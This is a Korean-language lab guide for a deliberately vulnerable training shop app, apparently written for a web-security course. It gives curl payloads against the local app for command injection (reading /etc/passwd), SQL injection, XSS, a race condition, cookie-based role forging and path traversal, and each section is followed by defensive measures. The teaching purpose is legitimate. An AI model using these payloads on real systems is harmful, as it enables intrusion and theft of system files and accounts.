# 해커 굿즈 쇼핑몰 - 보안 취약점 실습 가이드

## 🎯 실습 목표
이 애플리케이션은 웹 보안 교육을 위해 의도적으로 취약점을 포함한 쇼핑몰입니다.
**절대 실제 운영 환경에서 사용하지 마세요!**

## 🚀 서버 실행 방법

### 1. 일반 실행
```bash
# 의존성 설치
npm install

# 서버 시작
npm start
# 또는
PORT=3001 node server.js
```

### 2. Docker 실행
```bash
# 이미지 빌드
docker build -t hacker-shop:latest .

# 컨테이너 실행
docker run -p 3001:3001 hacker-shop:latest

# 또는 docker-compose 사용
docker-compose up --build
```

## 🔐 취약점 실습 가이드

### 1. Command Injection (명령어 주입)
**위치**: `/api/search` 엔드포인트
**공격 방법**:
```bash
# 기본 검색
curl "http://localhost:3001/api/search?q=키보드"

# 명령어 주입 공격
curl "http://localhost:3001/api/search?q=\"; ls -la; echo \""
curl "http://localhost:3001/api/search?q=\"; cat /etc/passwd; echo \""
curl "http://localhost:3001/api/search?q=\"; whoami; echo \""
```

**브라우저에서 테스트**:
```
http://localhost:3001/api/search?q="; ls -la; echo "
http://localhost:3001/api/search?q="; cat server.js; echo "
```

### 2. SQL Injection (SQL 주입)
**위치**: `/api/login` 엔드포인트
**공격 방법**:
```bash
# 정상 로그인
curl -X POST "http://localhost:3001/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "admin123"}'

# SQL 주입 공격
curl -X POST "http://localhost:3001/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin\" OR \"1\"=\"1", "password": "anything"}'
```

**브라우저에서 테스트**:
- 로그인 페이지에서 username: `admin' OR '1'='1`
- password: 아무거나

### 3. XSS (Cross-Site Scripting)
**위치**: `/api/profile` 엔드포인트
**공격 방법**:
```bash
# XSS 공격
curl "http://localhost:3001/api/profile?name=<script>alert('XSS')</script>"
curl "http://localhost:3001/api/profile?name=<img src=x onerror=alert('XSS')>"
```

**브라우저에서 테스트**:
```
http://localhost:3001/api/profile?name=<script>alert('XSS')</script>
http://localhost:3001/api/profile?name=<img src=x onerror=alert('XSS')>
```

### 4. Race Condition (경합 조건)
**위치**: `/api/order` 엔드포인트
**공격 방법**:
```bash
# 동시에 여러 주문 요청을 보내서 재고 검증 우회
for i in {1..10}; do
  curl -X POST "http://localhost:3001/api/order" \
    -H "Content-Type: application/json" \
    -d '{"productId": 1, "quantity": 100, "userId": 1}' &
done
wait
```

### 5. 권한 우회 (Authorization Bypass)
**위치**: `/api/admin/users` 엔드포인트
**공격 방법**:
```bash
# 관리자 권한 없이 접근 시도
curl "http://localhost:3001/api/admin/users"

# 쿠키 조작을 통한 권한 우회
curl "http://localhost:3001/api/admin/users" \
  -H "Cookie: role=admin"
```

### 6. 경로 탐색 (Path Traversal)
**위치**: `/api/upload` 엔드포인트
**공격 방법**:
```bash
# 정상 파일 업로드
curl -X POST "http://localhost:3001/api/upload" \
  -F "file=@test.txt" \
  -F "filename=test.txt"

# 경로 탐색 공격
curl -X POST "http://localhost:3001/api/upload" \
  -F "file=@test.txt" \
  -F "filename=../../../etc/passwd"
```

## 🛡️ 보안 대책

### 1. Command Injection 방지
- 사용자 입력을 직접 셸 명령어에 전달하지 않기
- 입력 검증 및 이스케이프 처리
- 화이트리스트 기반 검증

### 2. SQL Injection 방지
- 매개변수화된 쿼리 사용
- ORM 사용
- 입력 검증

### 3. XSS 방지
- 출력 인코딩
- CSP (Content Security Policy) 적용
- 입력 검증

### 4. Race Condition 방지
- 트랜잭션 사용
- 락(Lock) 메커니즘 적용
- 원자적 연산 사용

### 5. 권한 우회 방지
- 적절한 세션 관리
- JWT 토큰 사용
- 서버 사이드 권한 검증

### 6. 경로 탐색 방지
- 파일 경로 검증
- 업로드 디렉토리 제한
- 파일명 정규화

## 📚 추가 학습 자료

### OWASP Top 10
- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

### 보안 도구
- **Burp Suite**: 웹 애플리케이션 보안 테스트 도구
- **OWASP ZAP**: 오픈소스 보안 테스트 도구
- **Nmap**: 네트워크 스캐닝 도구
- **Wireshark**: 네트워크 패킷 분석 도구

## ⚠️ 주의사항
1. 이 애플리케이션은 **교육 목적**으로만 사용해야 합니다.
2. 실제 운영 환경에서는 절대 사용하지 마세요.
3. 다른 사람의 시스템에 대한 무단 침입은 불법입니다.
4. 실습은 자신의 환경에서만 진행하세요.

## 📞 문의
교육 관련 문의사항이 있으시면 강사에게 연락주세요.
